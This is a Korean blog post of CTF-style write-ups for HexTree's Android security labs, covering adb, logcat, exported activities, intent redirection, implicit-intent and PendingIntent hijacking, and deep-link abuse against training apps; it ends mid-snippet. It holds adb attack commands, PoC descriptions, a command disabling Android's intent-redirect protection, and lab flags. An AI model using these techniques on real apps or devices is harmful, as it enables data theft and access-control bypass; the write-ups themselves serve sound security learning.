---
layout: post
title: hextree.io - Android Track
page_description: hextree.io - Android Track 완료하기
category_key: ctf-wargame
summary: hextree.io - Android Track 완료하기
lead: hextree.io - Android Track 완료하기
featured: false
feature_order: 0
---

# HexTree Android Track Write Ups

> 주의: 이 문서는 HexTree 교육용 랩, 개인 에뮬레이터, 분석이 허가된 APK만 대상으로 하였음.

## 1. 첫 Android 앱 만들기

첫 과정에서는 Android Studio에서 Java 기반 Empty Views Activity를 만들고, 에뮬레이터에서 빌드·실행했다. XML layout의 view ID가 `R.id.*`로 코드에 연결되는 구조, `OnClickListener`의 이벤트 처리, `Intent(Intent.ACTION_VIEW, Uri.parse(...))`가 시스템의 intent resolver를 통해 외부 앱 또는 컴포넌트로 전달되는 구조를 확인했다. 이 기초는 이후 Manifest의 intent filter, `getIntent()` 입력, 역컴파일된 resource ID와 클릭 처리 경로를 읽는 기반이 됐다. [Android Developers: Activities and intents](https://developer.android.com/guide/components/activities/intro-activities)

## 2. 트랙별 상세 Write Ups

---

## 연구용 기기 및 에뮬레이터 설정 — 앱 관리

**Lab:** [앱 관리 (Managing Apps)](https://app.hextree.io/courses/research-device-setup/the-android-debug-bridge-adb/managing-apps)  
**대상:** HexTree 제공 `adb_test_application.apk`  
**기기:** `emulator-5554`

### 목표

1. 제공된 APK를 설치하고 실행한다.
2. 런처 화면에서는 열 수 없는 Activity를 찾아 ADB로 직접 실행한다.

### 절차

APK를 에뮬레이터에 설치한 뒤 package manager로 launcher Activity를 확인했다.

```powershell
adb -s emulator-5554 install -r .\adb_test_application.apk
adb -s emulator-5554 shell cmd package resolve-activity --brief io.hextree.adbtestapplication
# 결과: io.hextree.adbtestapplication/.MainActivity
adb -s emulator-5554 shell am start -n io.hextree.adbtestapplication/.MainActivity
```

첫 번째 Activity에서 다음 플래그가 표시됐다.

```text
HXT{Ready-to-Android}
```

두 번째 과제에서는 `dumpsys package` 출력에서 추가 Activity 항목을 확인했다.

```powershell
adb -s emulator-5554 shell dumpsys package io.hextree.adbtestapplication
# 결과: io.hextree.adbtestapplication/.HiddenActivity
```

런처 UI에는 보이지 않지만, 명시적 component name으로 직접 지정해 실행할 수 있다.

```powershell
adb -s emulator-5554 shell am start -n io.hextree.adbtestapplication/.HiddenActivity
```

이후 두 번째 플래그가 표시됐다.

```text
HXT{not-so-hidden-activity}
```

### 배운 점

런처는 `MAIN` action과 `LAUNCHER` category를 선언한 component만 보여 주므로, 앱의 모든 Activity 목록이 아니다. `dumpsys package`는 package manager에 등록된 component 정보를 보여 주며, `am start -n package/.Activity`는 지정한 component를 명시적으로 시작한다. 따라서 Android 앱을 점검할 때는 화면에 보이는 메뉴만 보지 말고 Manifest와 등록 component를 함께 확인해야 한다.

### logcat으로 로그 확인

**Lab:** [logcat으로 로그 확인 (Exploring Logs with logcat)](https://app.hextree.io/courses/research-device-setup/the-android-debug-bridge-adb/exploring-logs-with-logcat)

이 랩의 목표는 `MainActivity`가 로그에 남긴 값을 찾는 것이다. 이전 실행의 로그와 섞이지 않도록 buffer를 비우고 앱을 강제 종료한 뒤 launcher Activity를 다시 시작했다. 마지막 filter는 `MainActivity`의 verbose 이상 메시지만 남기고 다른 tag는 숨긴다.

```powershell
adb -s emulator-5554 logcat -c
adb -s emulator-5554 shell am force-stop io.hextree.adbtestapplication
adb -s emulator-5554 shell am start -n io.hextree.adbtestapplication/.MainActivity
adb -s emulator-5554 logcat -d "MainActivity:V *:S"
```

확인된 출력:

```text
V MainActivity: Congratulations, you found the log! Your flag is: HXT{log-all-the-cats}
```

**플래그:** `HXT{log-all-the-cats}`

### 참고 자료

- [HexTree 랩: 앱 관리](https://app.hextree.io/courses/research-device-setup/the-android-debug-bridge-adb/managing-apps)
- [HexTree 랩: logcat으로 로그 확인](https://app.hextree.io/courses/research-device-setup/the-android-debug-bridge-adb/exploring-logs-with-logcat)
- [Android Developers: adb `pm` 및 패키지 관리](https://developer.android.com/tools/adb#pm)
- [Android Developers: logcat 명령줄 도구](https://developer.android.com/tools/logcat)


---

## HexTree Intent Attack Surface: exported Activity와 Intent 입력 검증

### 1. 과정과 이번 실습의 목표

현재 수강 중인 과정은 [HexTree Intent Attack Surface](https://app.hextree.io/courses/intent-threat-surface)다. 그중 [`Practice startActivity()`](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/practice-startactivity)는 다음 세 Activity를 대상으로 `success()` 호출에 도달하는 것이 목표였다.

1. `Flag1Activity`를 시작한다.
2. `Flag2Activity`에 필요한 Intent를 전달한다.
3. `Flag3Activity`에 action과 data를 포함한 Intent를 전달한다.

### 2. 핵심 개념

Activity는 사용자가 수행하는 하나의 집중된 작업을 담당하며, 대개 화면 UI를 제공한다. [Android Developers: Activity API](https://developer.android.com/reference/android/app/Activity) Activity를 열기 위한 Intent는 수행할 작업을 기술하는 메시지다. [Android Developers: Intent API](https://developer.android.com/reference/android/content/Intent)

`android:exported="true"` Activity는 다른 앱 또는 ADB shell이 시작할 수 있는 공개 진입점이다. 공개 Activity 자체가 취약점은 아니지만, 외부에서 받은 Intent의 action·URI·extra를 신뢰하고 민감 기능을 실행하면 정상 앱 흐름을 우회할 수 있다. [Android Developers: Activities and intent filters](https://developer.android.com/guide/components/activities/intro-activities)

#### Android Binder와 Intent 전달 경로

Android Binder는 앱 프로세스와 시스템 서비스 사이의 IPC(프로세스 간 통신)를 담당하는 Linux kernel driver 기반 메커니즘이다. 서로 다른 앱은 보통 같은 메모리를 공유하지 않으므로, 한 앱의 `startActivity()` 요청은 Android framework를 거쳐 Binder IPC로 시스템 서비스에 전달되고, 시스템이 대상 Activity의 실행을 조정한다. [Linux kernel documentation: Binder](https://docs.kernel.org/admin-guide/binderfs.html)

앱 보안 분석에서 Binder 드라이버의 내부 구현까지 파고들 필요는 없는 경우가 많다고 하지만 다음 관계를 이해하면 도움이 될 것 같았다.

```text
호출 앱 / adb shell
        │  Intent 생성
        ▼
Android framework ── Binder IPC ──► 시스템 서비스
                                      │
                                      ▼
                               대상 앱의 Activity
                                      │
                                      ▼
                                  getIntent() 처리
```

즉 공격 표면은 Binder 자체보다 **Binder를 통해 도달한 후 수신 Activity가 어떤 Intent 입력을 신뢰하는가**에 있다. 따라서 이 과정에서는 Manifest의 공개 컴포넌트, Intent의 action/data/extras, 그리고 최종 인증·인가 검사를 우선 점검한다.

#### Activity vs. Service vs. BroadcastReceiver

Intent는 Activity만 시작하는 메시지가 아니다. Activity, Service, BroadcastReceiver는 서로 다른 방식으로 Intent를 수신하며, 각각 별도의 공격 표면이 된다. HexTree도 이 세 컴포넌트를 Intent attack surface의 일부로 소개한다. [HexTree: Activity vs. Service vs. Receiver](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/activity-vs-service-vs-receiver)

| 컴포넌트 | 주 역할 | 일반적인 Intent 진입점 | 우선 점검할 위험 |
|---|---|---|---|
| Activity | 사용자 화면·상호작용 | `startActivity()` → `getIntent()` | exported 화면 접근, Deep Link/extra로 인증 흐름 우회 |
| Service | UI 없이 실행되는 작업 또는 bind API | `startService()` / `bindService()` | 외부 앱의 작업 실행, binder API를 통한 민감 데이터·기능 접근 |
| BroadcastReceiver | 시스템·앱 broadcast 수신 후 짧은 처리 | `sendBroadcast()` → `onReceive()` | 위조 action 수용, broadcast extra로 상태 변경 |

**Activity**는 사용자가 보는 화면과 연결되는 경우가 많아 화면 전환이나 Deep Link가 주요 진입점이다. 따라서 `onCreate()`의 `getIntent()`뿐 아니라 기존 인스턴스에 새 Intent가 도착할 수 있는 `onNewIntent()`도 확인한다.

**Service**는 UI가 없어도 작업을 수행하거나 다른 앱에 bind 가능한 API를 제공할 수 있다. exported Service가 권한 검증 없이 작업 명령을 받으면 외부 앱이 해당 앱의 권한 맥락에서 동작을 실행시킬 수 있다. 외부 공개가 필요 없다면 `android:exported="false"`가 기본이며, 필요할 때는 permission과 호출자 검증을 적용한다. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)

**BroadcastReceiver**는 시스템 이벤트 또는 앱이 보낸 broadcast를 처리한다. action 문자열만 보고 발신자를 신뢰하면 다른 앱이 같은 action을 보낸 위조 broadcast로 상태 변경을 유발할 수 있다. 비공개 receiver, 명시적 broadcast, signature permission, extra 검증이 기본 방어다. [Android Developers: Broadcasts overview](https://developer.android.com/develop/background-work/background-tasks/broadcasts)

세 경우 모두 분석의 시작점은 같다. Manifest에서 `exported`, `permission`, `intent-filter`를 확인하고, 수신 코드에서 **외부 입력이 민감 동작에 닿기 전 어떤 인증·인가 검사를 거치는지** 추적한다.

### 3. 환경과 증적

| 항목 | 값 |
|---|---|
| 대상 APK | `io.hextree.attacksurface.apk` |
| 대상 패키지 | `io.hextree.attacksurface` |
| 실행 환경 | 개인 Android Studio AVD `emulator-5554` |
| 정적 분석 | Android SDK Build Tools `aapt dump xmltree` |
| 동적 검증 | `adb shell am start`, Logcat, HexTree 제출 화면 |

APK를 설치한 뒤 `AndroidManifest.xml`을 확인했다. 그 결과 세 대상 Activity는 모두 `exported="true"`였고, Flag 2와 Flag 3은 추가 Intent 조건을 갖고 있었다.

| 대상 | Manifest에서 확인한 조건 |
|---|---|
| `Flag1Activity` | `exported="true"` |
| `Flag2Activity` | `exported="true"`, action `io.hextree.action.GIVE_FLAG` |
| `Flag3Activity` | `exported="true"`, action `io.hextree.action.GIVE_FLAG`, data scheme `https` |

### 4. 재현과 결과

#### Flag 1 — 공개된 Activity 직접 시작

명시적 component만 지정해 Activity를 시작했다.

```powershell
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag1Activity
```

Logcat에서 `Flag1: success() called!`를 확인했고, HexTree 제출 화면도 성공으로 바뀌었다.

**원인:** Activity가 외부에 공개되어 있고, 시작한 호출자나 인증 상태를 확인하지 않은 채 성공 처리로 이동했다.

#### Flag 2 — action 값이 포함된 Intent

`Flag2Activity`는 전달된 Intent의 action을 확인하므로, component와 action을 함께 지정했다.

```powershell
adb shell am start -W `
  -n io.hextree.attacksurface/.activities.Flag2Activity `
  -a io.hextree.action.GIVE_FLAG
```

Logcat에서 `Flag2: success() called!`를 확인했고 HexTree 제출도 성공했다.

**원인:** 공개된 action 문자열은 비밀이 아니며 외부 호출자가 동일한 값을 쉽게 포함할 수 있다. action 일치 검사만으로는 호출자 인증이 되지 않는다.

#### Flag 3 — action과 정확한 data URI

Flag 3은 action 외에 data URI 전체 값도 필요했다. Manifest의 `https` scheme 정보와 APK 코드 흐름을 바탕으로 다음 Intent를 구성했다.

```powershell
adb shell am start -W `
  -n io.hextree.attacksurface/.activities.Flag3Activity `
  -a io.hextree.action.GIVE_FLAG `
  -d "https://app.hextree.io/map/android"
```

Logcat에서 `Flag3: success() called!`를 확인했고 HexTree 제출도 성공했다.

**원인:** URI가 정확하다는 사실은 호출자가 신뢰할 수 있다는 근거가 아니다. 공개된 APK에서 조건을 분석한 외부 앱도 동일한 Intent를 만들 수 있다.

### 5. Implementing Intent Debug Features

[`Implementing Intent Debug Features`](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/implementing-intent-debug-features) 페이지에서는 Flag 4·5·7을 추가로 재현했다. 세 항목 모두 개인 AVD의 Logcat에서 `success() called!`를 확인하고 HexTree에 제출해 성공 처리됐다.

#### Flag 4 — 순서가 있는 다중 호출

`Flag4Activity`는 단일 Intent가 아니라 Activity 내부 상태 머신의 올바른 전이를 요구했다. ADB로 같은 Activity를 아래 순서로 시작했다.

```powershell
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag4Activity -a INIT_ACTION
```

Logcat은 `INIT → PREPARE → BUILD → GET_FLAG` 전이와 마지막 `success()` 호출을 기록했다. 공개된 action 문자열만 확인하는 방식은 외부 호출자가 같은 상태 전이를 재현할 수 있으므로 인증 수단이 될 수 없다.

#### Flag 5 — Intent 안의 Intent

Flag 5는 ADB의 문자열 extra만으로 만들기 어려운 `Intent` 객체 중첩 구조를 요구했다. 그래서 학습용 최소 PoC를 새로 제작함. [PoC 소스](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/MainActivity.java)는 다음 구조를 구성한다.

```text
Flag5Activity를 여는 outer Intent
└── Intent.EXTRA_INTENT: nested Intent
    ├── "return": 42
    └── "nextIntent": innermost Intent
        └── "reason": "back"
```

PoC APK를 AVD에 설치하고 `io.hextree.intentpoc/.MainActivity`를 실행했을 때, 대상 Activity에서 `success()`가 호출됐다. 중첩 Intent는 단순 문자열보다 복잡한 입력 구조를 만들 수 있으므로, 수신 앱은 각 레벨의 component·action·data·extras를 별도로 검증해야 한다.

#### Flag 7 — `onNewIntent()`와 Activity 생명주기

이 항목은 `onCreate()`가 아니라 이미 화면 최상단에 존재하는 Activity의 `onNewIntent(Intent)` 처리 경로를 겨냥한다. 먼저 `OPEN`으로 Activity 인스턴스를 만들고, 이어서 `FLAG_ACTIVITY_SINGLE_TOP`과 `REOPEN` action을 포함한 Intent를 보냈다.

```powershell
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN
adb shell am start -W -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top
```

두 번째 호출에서 ADB는 최상단 인스턴스에 Intent가 전달됐다고 보고했고, Logcat에서 `Flag7: success() called!`를 확인했다. Android 문서의 Activity 생명주기 설명처럼 새 Intent는 상황에 따라 새 Activity를 만들지 않고 기존 인스턴스에 전달될 수 있으므로, `onNewIntent()`도 `onCreate()`와 같은 수준으로 외부 입력을 검증해야 한다. [Android Developers: Activity lifecycle](https://developer.android.com/guide/components/activities/activity-lifecycle)

### 6. Intent Redirect — 비공개 Activity를 대신 실행시키기

[`Intent Redirect`](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/intent-redirect) 랩의 목표는 `exported=false`인 `Flag6Activity`를 직접 열지 않고, 외부에 공개된 `Flag5Activity`가 대신 시작하게 만드는 것이었다. Manifest에서 Flag5는 외부 진입점이고 Flag6은 비공개 컴포넌트임을 확인했다.

처음에는 Flag5로 전달할 중첩 Intent에 Flag6을 명시적으로 지정했지만, Android 17(API 37) 에뮬레이터는 기본 Intent-redirection 보호로 이를 차단했다. Logcat에는 `INTENT_REDIRECT_ABORT_START_ANY_ACTIVITY_PERMISSION`과 “not exported”가 함께 기록됐다. 이는 Android 16부터 중첩 Intent의 위험한 재전달을 기본적으로 방지한다는 Android 보안 문서의 설명과 일치한다. [Android Developers: Intent redirection](https://developer.android.com/privacy-and-security/risks/intent-redirection)

랩이 의도한 기존 취약 흐름을 재현하기 위해, **개인 AVD의 대상 교육 앱에 한해서만** Android 호환성 변경값 `ENABLE_PREVENT_INTENT_REDIRECT_TAKE_ACTION`을 비활성화했다. 이는 앱 소스를 수정하거나 실제 서비스 설정을 바꾼 것이 아니라, 최신 테스트 OS의 보안 동작을 랩 제작 당시의 환경에 맞춘 것이다.

```powershell
adb shell am compat disable ENABLE_PREVENT_INTENT_REDIRECT_TAKE_ACTION io.hextree.attacksurface
```

그 뒤 교육용 PoC의 [RedirectActivity.java](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/RedirectActivity.java)가 다음 구조의 Intent를 만들도록 했다.

```text
공격자 앱 RedirectActivity
  └─ explicit Intent → exported Flag5Activity
       └─ Intent.EXTRA_INTENT
            ├─ "return": 42
            └─ "nextIntent": explicit Intent → non-exported Flag6Activity
                 ├─ "reason": "next"
                 └─ FLAG_GRANT_READ_URI_PERMISSION
```

PoC를 실행하자 `Flag5Activity`가 수신한 `nextIntent`를 그대로 시작했고, ADB 결과의 최종 Activity가 `Flag6Activity`로 표시됐다. Logcat에서도 `Flag6: success() called!`을 확인했고 HexTree 제출이 성공했다.

**취약 원인:** exported 컴포넌트가 외부에서 전달한 중첩 Intent를 검증 없이 `startActivity()`에 넘겼다. 비공개 Activity라도 같은 앱의 공개 컴포넌트가 “대리 실행”해 주면 접근 제어가 무력화된다.

**방어:** 중첩 Intent를 그대로 전달하지 않는다. 불가피하다면 component·action·data를 allowlist로 검증하고 URI 권한 플래그를 제거한 새 Intent를 구성한다. Android는 `IntentSanitizer` 사용과 중첩 Intent의 검증을 권장한다. 최신 OS의 `removeLaunchSecurityProtection()`은 랩 호환성 확인을 위한 API일 뿐, 운영 앱의 해결책이 아니다. [Android Developers: Intent redirection mitigations](https://developer.android.com/privacy-and-security/risks/intent-redirection#mitigations)

### 7. Returning Activity Results — 호출자와 반환값을 신뢰하면 안 되는 이유

[`Returning Activity Results`](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/returning-activity-results)에서는 Activity가 단방향 화면 전환만 하는 것이 아니라, 호출자에게 `resultCode`와 결과 Intent를 돌려줄 수 있음을 실습했다. Android는 기존 `startActivityForResult()`/`onActivityResult()`도 지원하지만, 새 코드에는 Activity Result API 사용을 권장한다. [Android Developers: Get a result from an activity](https://developer.android.com/training/basics/intents/result)

#### Flag 8 — 호출자 클래스명으로 인증 우회

APK 코드를 확인하니 `Flag8Activity`는 `getCallingActivity().getClassName()`에 문자열 `Hextree`가 포함되는지만 검사했다. 호출자 Activity의 이름을 `HextreeActivityResultActivity`로 두고 `startActivityForResult()`로 Flag8을 시작했다. [PoC 소스](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/HextreeActivityResultActivity.java)

```text
HextreeActivityResultActivity
  └─ startActivityForResult(Flag8Activity, 800)
       └─ callingActivity class name에 "Hextree" 포함 → success()
```

Logcat에서 `Flag8: success() called!`을 확인했고 HexTree 제출도 성공했다.

**취약 원인:** 호출자 클래스명은 신뢰 경계가 아니다. 공격자는 자기 앱의 Activity 이름을 동일한 문자열이 들어가도록 만들 수 있으므로, 이름 부분 일치로는 앱 신원을 증명할 수 없다.

#### Flag 9 — 결과 Intent에서 민감 정보 수신

동일한 PoC가 Flag9를 결과용으로 시작하자, Flag9는 `RESULT_OK(-1)` 및 action `flag`의 Intent를 종료 시 호출자에게 반환했다. PoC의 `onActivityResult()`는 반환 Intent의 extra 키 `flag`와 값을 Logcat으로 기록했고, 해당 값으로 HexTree 제출에 성공했다.

```text
HextreeActivityResultActivity
  └─ startActivityForResult(Flag9Activity, 800)
       └─ setResult(RESULT_OK, Intent("flag").putExtra("flag", …))
            └─ onActivityResult(800, RESULT_OK, data)
                 └─ data.getStringExtra("flag")
```

**보안 의미:** 결과 Intent는 호출자에게 전달되는 데이터 채널이다. 민감 정보를 결과로 반환하기 전에는 호출자를 신뢰할 수 있는 방식(예: signature permission, 서명 검증, 명시적으로 설계된 IPC 계약)으로 확인해야 한다. 반대로 호출자도 반환된 Intent의 `resultCode`·형식·URI 권한을 검증해야 한다.

> Flag 원문은 공개 블로그에 기록하지 않고, 개인 Logcat과 HexTree 성공 화면에만 보관했다.

### 8. Hijack Implicit Intents — 의도하지 않은 앱이 데이터 수신자가 되는 경우

[`Hijack Implicit Intents`](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/hijack-implicit-intents) 랩에서는 action만 지정하고 component를 지정하지 않은 암시적 Intent를 자체 PoC가 수신하게 했다. Android는 암시적 Intent의 action·data·category를 기기 앱의 manifest intent-filter와 비교해 수신 컴포넌트를 고른다. 따라서 component가 없으면 제3자 앱도 같은 조건의 filter를 등록할 수 있다. [Android Developers: Intents and intent filters](https://developer.android.com/guide/components/intents-filters)

PoC에는 다음 filter와 결과 처리기를 추가했다. [ImplicitIntentHandlerActivity.java](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/ImplicitIntentHandlerActivity.java)

```xml
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

#### Flag 10 — 암시적 Intent에 포함된 flag 탈취

앱 내부 목록에서 Flag10을 실행하면 대상은 `io.hextree.attacksurface.ATTACK_ME` action의 암시적 Intent에 `flag` extra를 넣어 `startActivity()`를 호출한다. PoC의 수신 Activity가 선택되자 Logcat에 `extra flag=…`가 기록됐고, 대상 앱의 `success()`와 HexTree 제출 성공도 확인했다.

**취약 원인:** 내부용 민감 데이터를 component가 없는 Intent에 넣었다. action 문자열은 누구나 동일하게 선언할 수 있으므로 수신자 인증 역할을 하지 못한다.

#### Flag 11 — 결과를 반환하는 암시적 Intent

Flag11은 같은 action을 `startActivityForResult()`로 호출하고, 반환 Intent의 `token` 정수값을 검사했다. PoC는 수신 뒤 아래처럼 결과를 반환했다.

```java
setResult(RESULT_OK, new Intent().putExtra("token", 0x41414141));
finish();
```

그 결과 Flag11의 `onActivityResult()` 조건이 충족되어 `success()`와 HexTree 제출 성공을 확인했다. 고정 token은 앱 안에 존재하는 값이므로, 인증 수단이 아니라 재현 가능한 입력일 뿐이다.

#### Flag 12 — 내부 Activity 진입 조건과 반환 조건 결합

Flag12는 반환 `token`뿐 아니라, 자신이 처음 시작될 때 받은 Intent의 `LOGIN=true`도 요구했다. Flag12는 외부에 공개되지 않았으므로, 앞서 재현한 Flag5의 Intent Redirect를 이용해 `LOGIN=true`가 포함된 explicit nested Intent로 Flag12를 시작했다. 이후 Flag12가 보낸 암시적 결과 요청을 같은 PoC가 받고 `token`을 반환했다.

```text
공격자 PoC → exported Flag5Activity → non-exported Flag12Activity (LOGIN=true)
                                      └─ implicit ATTACK_ME intent
                                           └─ PoC handler → token 반환
```

최신 Android 17 AVD에서는 Intent Redirect 보호가 이 이전 랩 흐름을 기본 차단하므로, 개인 AVD의 교육 앱에 한해 호환성 변경값을 임시 적용해 재현했고 곧바로 원복했다. 최종적으로 Flag12의 `success()`와 HexTree 제출 성공을 확인했다.

**방어:** 자체 앱 내부 컴포넌트로 보내는 민감 Intent는 explicit Intent를 사용한다. 다른 앱과 연동해야 한다면 필요한 데이터만 보내고, 수신 후보·반환 데이터·URI 권한을 검증하며 민감한 인증 결정을 고정 action/token에 의존하지 않는다. Android 문서도 component를 지정하지 않으면 시스템이 다른 앱의 filter로 수신자를 정한다고 설명한다. [Android Developers: intent resolution](https://developer.android.com/guide/components/intents-filters#Types)

> Flag 원문은 공개 블로그에 기록하지 않고, 개인 Logcat과 HexTree 성공 화면에만 보관했다.

### 9. Delegation via PendingIntent — 권한 위임 토큰을 신뢰하면 생기는 문제

[`Delegation via Pending Intents`](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/delegation-via-pending-intents)에서는 `PendingIntent`가 단순 데이터가 아니라 **나중에 다른 앱이 실행할 수 있는 권한 위임 토큰**이라는 점을 실습했다. Android 보안 문서는 `PendingIntent`를 앱 A가 앱 B에게 전달해, 앱 B가 앱 A를 대신해 미리 정의된 작업을 실행할 수 있게 하는 system token으로 설명한다. [Android Developers: Pending intents](https://developer.android.com/privacy-and-security/risks/pending-intent)

#### Flag 22 — 공격자가 만든 mutable PendingIntent에 flag 채우기

Manifest에서 `Flag22Activity`는 `exported=true`였다. PoC는 우리 앱의 `PendingIntentSinkActivity`를 대상으로 하는 mutable `PendingIntent`를 만든 뒤, 이를 `PENDING` extra로 넣어 Flag22를 직접 시작했다. [PendingIntentShareActivity.java](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/PendingIntentShareActivity.java)

```text
공격자 PoC
  └─ mutable PendingIntent → PoC의 PendingIntentSinkActivity
       └─ extra "PENDING"으로 exported Flag22Activity에 전달
            └─ Flag22Activity가 fill-in Intent에 success=true, flag=... 추가 후 send()
                 └─ PoC sink가 flag extra 수신
```

Logcat에서 `Flag22: success() called!`와 flag 출력이 확인됐다. 최신 Android에서는 background activity launch 제한 로그도 함께 보였지만, 랩의 성공 조건과 flag 출력은 정상적으로 발생했다.

**취약 원인:** 대상 Activity가 외부 앱이 제공한 `PendingIntent`를 신뢰하고 민감한 flag 값을 그대로 채워 보냈다. 이 경우 민감 정보의 최종 수신자는 대상 앱이 아니라 PendingIntent를 만든 공격자 앱이 된다.

#### Flag 23 — 외부로 공유된 mutable PendingIntent 변조

`Flag23Activity`는 `exported=false`라 ADB나 외부 앱에서 직접 시작할 수 없었다. 대신 앱 내부 목록에서 Flag23을 실행하면 대상 앱이 `io.hextree.attacksurface.MUTATE_ME` action의 암시적 Intent를 보내고, 그 안에 mutable `PendingIntent`를 담았다. PoC는 같은 action의 intent-filter를 등록해 이 Intent를 수신했다. [PendingIntentHijackerActivity.java](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/PendingIntentHijackerActivity.java)

PoC handler는 받은 `pending_intent`를 꺼낸 뒤 fill-in Intent에 `code=42`를 넣어 `send()`했다.

```text
Flag23Activity
  └─ implicit MUTATE_ME Intent + mutable pending_intent
       └─ PoC handler가 수신
            └─ pending_intent.send(fillIn: code=42)
                 └─ non-exported Flag23Activity가 GIVE_FLAG action + code=42로 재실행
```

최종 Logcat에서 `Flag23: success() called!`와 flag 출력이 확인됐다.

**취약 원인:** 비공개 Activity를 가리키는 mutable `PendingIntent`를 암시적 Intent로 외부에 공유했다. 외부 앱은 비공개 Activity를 직접 열 수 없지만, PendingIntent를 통해 대상 앱의 권한 맥락으로 다시 실행하면서 빈 extra 값을 채울 수 있었다. Android 문서도 mutable PendingIntent의 비어 있는 필드는 상대 앱이 `fillIn()` 규칙에 따라 갱신할 수 있고, 이로 인해 원래 접근할 수 없는 컴포넌트 접근으로 이어질 수 있다고 설명한다. [Android Developers: Mutable Pending Intents](https://developer.android.com/privacy-and-security/risks/pending-intent#risk-mutable-pending-intents)

**방어:** PendingIntent는 기본적으로 `FLAG_IMMUTABLE`을 사용하고, 여러 번 사용할 필요가 없으면 `FLAG_ONE_SHOT`도 함께 고려한다. 꼭 mutable이 필요하다면 component, package, action 등 핵심 필드를 명시하고 외부로 전달하는 채널을 제한한다. 민감 기능을 실행하는 PendingIntent를 암시적 Intent로 넓게 뿌리는 구조는 피해야 한다. [Android Developers: PendingIntent API](https://developer.android.com/reference/android/app/PendingIntent)

> Flag 원문은 공개 블로그에 기록하지 않고, 개인 Logcat과 HexTree 성공 화면에만 보관했다.

### 10. Browser-to-App Attack Surface — 브라우저 링크가 앱 진입점이 되는 경우

[`Browser-to-App Attack Surface`](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/browser-to-app-attack-surface)는 앱 간 Intent뿐 아니라, 웹 브라우저에서 클릭한 링크도 Android Intent 라우팅을 거쳐 앱 Activity에 도달할 수 있음을 다룬다. Android 문서는 deep link를 브라우저, 알림, 소셜 미디어 등 외부 출처에서 사용자를 앱의 특정 화면으로 바로 보내는 기능으로 설명한다. [Android Developers: Create deep links](https://developer.android.com/training/app-links/create-deeplinks)

#### Flag 13 — `hex://` custom scheme으로 Activity 열기

Manifest에서 `Flag13Activity`는 `exported=true`이고, `ACTION_VIEW`, `DEFAULT`, `BROWSABLE` category를 가진 deep link filter를 갖고 있었다.

```text
scheme: hex
host: open
host: flag
```

여기서 중요한 점은 `<intent-filter>` 하나 안의 여러 `<data>` 요소가 각각 독립 조건이 아니라 조합되어 해석될 수 있다는 점이다. Android 문서도 같은 filter 안에 여러 `<data>`를 넣으면 의도하지 않은 scheme/host 조합까지 지원될 수 있다고 경고한다. [Android Developers: `<data>` and merged combinations](https://developer.android.com/training/app-links/create-deeplinks)

페이지는 `hex://open` 형태의 링크 빌더를 예시로 제공했지만, 실제 성공 조건은 deep link host가 `flag`이고 query parameter `action=give-me`인 경우였다. 브라우저에서 들어온 deep link처럼 보이도록 `BROWSABLE` category와 `com.android.browser.application_id` extra를 포함해 실행했다.

```powershell
adb shell am start `
  -a android.intent.action.VIEW `
  -c android.intent.category.BROWSABLE `
  -d "hex://flag?action=give-me" `
  --es com.android.browser.application_id com.android.chrome
```

Logcat에서 `Flag13: success() called!`를 확인했고 flag 출력도 확인했다.

**취약 원인:** deep link URI의 host와 query parameter만으로 민감 동작을 실행했다. custom scheme은 다른 앱 또는 브라우저 링크에서도 만들 수 있으므로, 링크 형식 일치만으로 신뢰할 수 있는 호출자라고 볼 수 없다.

**방어:** deep link는 공개 입력으로 취급한다. 민감 기능은 링크만으로 실행하지 말고 인증 상태, CSRF성 nonce/state, 서버 검증 등 별도 조건을 확인한다. 웹 도메인 기반 링크라면 Android App Links처럼 도메인 소유권 검증을 사용하는 편이 더 안전하다. Android 문서도 자체 웹 도메인에는 App Links 사용을 권장한다. [Android Developers: App Links recommendation](https://developer.android.com/training/app-links/create-deeplinks)

### 11. Hijacking Deep Link Intents — 로그인 callback 가로채기

[`Hijacking Deep Link Intents`](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/hijacking-deep-link-intents)는 deep link가 결국 implicit Intent resolution을 거친다는 점을 이용한다. Android 문서는 같은 URI를 처리할 수 있는 앱이 여러 개면 사용자의 기본 선택 또는 disambiguation dialog에 따라 라우팅된다고 설명한다. [Android Developers: Deep link routing](https://developer.android.com/training/app-links/create-deeplinks)

#### Flag 14 — `hex://token` callback 변조 후 전달

Manifest에서 `Flag14Activity`는 `hex://token` deep link를 받는 exported Activity였다. 앱을 직접 실행하면 `https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-app-auth?authChallenge=...` 형태의 웹 로그인 mock을 Chrome으로 열었다. 사용자가 `CONNECT`를 누르면 웹 페이지는 다시 `hex://token?...` callback을 호출한다.

PoC 앱은 대상 앱과 같은 `hex://token` intent-filter를 등록했다. [DeepLinkHijackerActivity.java](intent-attack-surface-flag5-poc/app/src/main/java/io/hextree/intentpoc/DeepLinkHijackerActivity.java)

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
